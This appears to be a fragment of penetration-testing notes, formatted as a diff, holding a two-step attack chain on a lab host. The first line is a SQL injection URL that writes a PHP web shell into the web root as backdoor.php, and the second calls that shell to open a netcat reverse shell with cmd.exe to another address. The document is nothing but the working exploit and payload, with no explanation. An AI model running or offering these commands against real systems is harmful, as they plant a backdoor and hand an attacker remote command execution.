@@ -1,0 +1,3 @@
+http://10.11.25.68/comment.php?id=763%20UNION%20select%20all%201,2,3,4,%22%3C?php%20echo%20shell_exec($_GET[%27cmd%27]);?%3E%22,6%20into%20OUTFILE%20%27c:/xampp/htdocs/backdoor.php%27
+
+10.11.25.68/backdoor.php?cmd=nc -nv 10.11.0.210 443 -e cmd.exe
